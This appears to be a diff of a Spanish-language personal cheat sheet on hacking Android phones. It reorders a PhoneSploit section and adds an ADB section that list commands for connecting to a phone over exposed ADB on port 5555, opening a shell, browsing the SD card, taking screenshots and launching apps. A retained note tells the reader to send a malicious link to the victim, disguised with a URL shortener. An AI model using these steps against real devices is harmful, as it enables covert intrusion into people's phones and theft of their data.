@@ -1,6 +1,48 @@
 # Hacking a plataformas móviles 
 
-Tags: #Hacking #Android 
+Tags: #Hacking #Android #Ñ 
+
+## PhoneSploit
+
+```bash 
+# Kali Tool para conectarse a un celular Android a la PC con el 'ADB-enabled' y análisis binario 
+❯ python3 -m pip install colorama  
+
+Nota:
+	1. El puerto al que se debe de conectar el es 5555
+
+
+❯ python3 phonesploit.py   # Ejecutar la herramienta 
+
+	❯ 3                   # Conectar un nuevo telefono 
+	❯ IP_Phone            # Agregar la dirección IP del telefono 
+		❯ 4              # Acceder a una shell en el dispositivo 
+		❯ pwd            # Mirar el directorio actual 
+		❯ ls             # Listar el contenido 
+		❯ cd sdcard      # Ir a la tarjeta SD 
+		❯ cd Download    # Ir al directorio donde se encuentra la imagen a descargar 
+		❯ exit
+	❯ 7                   # Screen shot a picture on a phone
+		❯ /home/kali/Desktop    # Agregar la ruta en donde se guardará el Screen Shot 
+	❯ 14                  # Lista todas las aplicaciones en el telefono 
+	❯ 15                  # Ejecutar una aplicación 
+		❯ com.android.calculator2   # Ejecutar la acción e iniciar la calculadora en el telefono 
+	❯ 18                  # Muestra info de Mac/Inet
+	❯ 21                  # NetStat que es el status de la conectividad de red 
+```
+
+## ADB
+
+```bash 
+# Powershell Tool para conectarse a un celular Android a la PC con el 'ADB-enabled'
+
+❯ adb devices            # Mirar los dispositivos disponibles para la conexión
+❯ adb connect IP:5555    # Cenectar al dispositivo Android 
+❯ adb shell              # Obtener una shell del dispositivo
+
+	❯ ls                # Listar el contenido 
+	❯ cd sdcard         # Ir al directorio 
+```
 
 ## Binary payloads
 
@@ -54,30 +96,6 @@ Tags: #Hacking #Android
 Nota:
 	1. Se debe mandar el enlace malicioso a la víctima 
 	2. Se puede colocar la url en un acortador como 'TinyURL'
-```
-
-## PhoneSploit
-
-```bash 
-# Kali Tool para conectarse a un celular Android con el 'ADB-enabled'
-❯ python3 -m pip install colorama  
-❯ python3 phonesploit.py                 # Ejecutamos la herramienta 
-
-	❯ 3                   # Conectar un nuevo telefono 
-	❯ IP_Phone            # Agregar la dirección IP del telefono 
-		❯ 4              # Acceder a una shell en el dispositivo 
-		❯ pwd            # Mirar el directorio actual 
-		❯ ls             # Listar el contenido 
-		❯ cd sdcard      # Ir a la tarjeta SD 
-		❯ cd Download    # Ir al directorio donde se encuentra la imagen a descargar 
-		❯ exit
-	❯ 7                   # Screen shot a picture on a phone
-		❯ /home/kali/Desktop    # Agregar la ruta en donde se guardará el Screen Shot 
-	❯ 14                  # Lista todas las aplicaciones en el telefono 
-	❯ 15                  # Ejecutar una aplicación 
-		❯ com.android.calculator2   # Ejecutar la acción e iniciar la calculadora en el telefono 
-	❯ 18                  # Muestra info de Mac/Inet
-	❯ 21                  # NetStat que es el status de la conectividad de red 
 ```
 
 ## AndroRAT
